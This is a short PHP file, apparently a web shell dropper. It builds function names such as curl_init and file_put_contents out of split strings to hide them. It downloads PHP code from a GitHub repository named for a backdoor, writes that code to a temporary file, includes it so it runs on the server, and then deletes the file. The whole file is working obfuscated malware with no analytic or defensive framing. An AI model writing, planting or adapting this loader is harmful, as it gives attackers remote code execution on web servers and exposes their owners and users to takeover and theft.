<?php
$TRA = 'ev';
$TRO = 'al';
$TRE = 'file_g';
$TRI = 'et_cont';
$TRU = 'ents';
$TAR = 'file_p';
$TIR = 'ut_con';
$TUR = 'tents';

$a = 'curl_';
$b = 'init';
$c = $a . $b;

$d = 'curl_';
$e = 'exec';
$f = $d . $e;

$g = 'curl_';
$h = 'close';
$i = $g . $h;

$EVA = $TRA . $TRO;
$FGC = $TRE . $TRI . $TRU;
$FPC = $TAR . $TIR . $TUR;

function getFileContents($url) {
    global $c, $f, $i;
    $ch = $c();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = $f($ch);
    $i($ch);
    return $data;
}

$a = getFileContents('https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/jq.php');
$tempFile = tempnam(sys_get_temp_dir(), 'php');
$FPC($tempFile, $a);
include $tempFile;
unlink($tempFile);
?>
